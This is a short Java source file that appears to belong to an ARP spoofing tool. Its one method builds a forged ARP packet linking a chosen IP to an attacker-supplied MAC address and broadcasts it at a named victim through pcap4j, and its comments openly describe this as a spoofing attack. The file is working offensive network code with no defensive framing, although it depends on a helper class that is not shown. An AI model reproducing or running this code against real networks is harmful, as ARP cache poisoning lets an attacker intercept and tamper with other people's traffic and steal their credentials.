package emma.arp;

import emma.PacketUtils;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.MacAddress;

import java.net.InetAddress;

/**
 * Created 12/06/2022 by SuperMartijn642
 */
public class ARPSpoofing {

    /**
     * Creates a spoof ARP packet to map ip to mac and sends it to victim_ip.
     * @param ip         ip to spoof
     * @param mac        mac-address to map the spoofed ip to
     * @param victimIp   target for the spoofing attack
     * @param connection network connection to be used
     * @throws NotOpenException    if the given connection is not active
     * @throws PcapNativeException if an error occurs whilst sending the packet
     */
    public static void sendSpoofedARPPacket(InetAddress ip, MacAddress mac, InetAddress victimIp, PcapHandle connection) throws NotOpenException, PcapNativeException{
        // Create ARP packet
        Packet.Builder arpPacket = PacketUtils.createARPRequestPacket(ip, mac, victimIp);
        // Wrap the ARP packet in an Ethernet packet
        Packet packet = PacketUtils.wrapInEthernetPacket(mac, MacAddress.ETHER_BROADCAST_ADDRESS, EtherType.ARP, arpPacket).build();

        // Now send the packet
        connection.sendPacket(packet);
    }
}
